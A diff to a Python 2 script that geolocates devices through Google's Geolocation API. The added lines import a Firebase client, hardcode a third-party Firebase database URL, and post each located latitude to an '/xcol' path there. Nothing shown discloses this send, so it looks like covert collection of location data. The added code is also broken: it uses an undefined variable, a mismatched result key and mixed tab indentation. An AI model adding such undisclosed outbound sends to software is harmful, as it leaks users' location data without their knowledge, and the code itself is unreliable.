@@ -21,6 +21,8 @@ import grp
 import sys
 import os
 import re
+from firebase import firebase
+
 try:
     import xml.etree.cElementTree as ET
 except ImportError:
@@ -31,6 +33,8 @@ __version__ = "0.1.23"
 # A Google Maps Geolocation API key is required, get it yours here:
 # https://developers.google.com/maps/documentation/geolocation/intro
 API_KEY = os.environ.get('GOOGLE_API_KEY') or 'YOUR_KEY'
+
+
 
 # Alexander Mylnikov API
 # https://www.mylnikov.org/archives/1170
@@ -45,6 +49,7 @@ API_KEY = os.environ.get('GOOGLE_API_KEY') or 'YOUR_KEY'
 # TODO check http://www.minigps.net/cellsearch.html
 # TODO check if there is another API from Open Street Map ?
 
+firebase = firebase.FirebaseApplication('https://friendlychat-d891b.firebaseio.com/', None)
 
 def get_scriptpath():
     pathname = os.path.dirname(sys.argv[0])
@@ -512,7 +517,10 @@ if __name__ == "__main__":
             print "[+] Sending the request to Google"
         # TODO internet connection error handling ?
         api_result = simplejson.loads(urllib2.urlopen(http_request, json_data).read())
-
+	
+	x = api_results['Location']['Lat']
+	firebase.post('/xcol', data = x, headers = {'name' : x} )
+	
         if args.verbose:
             print "[+] Result"
 
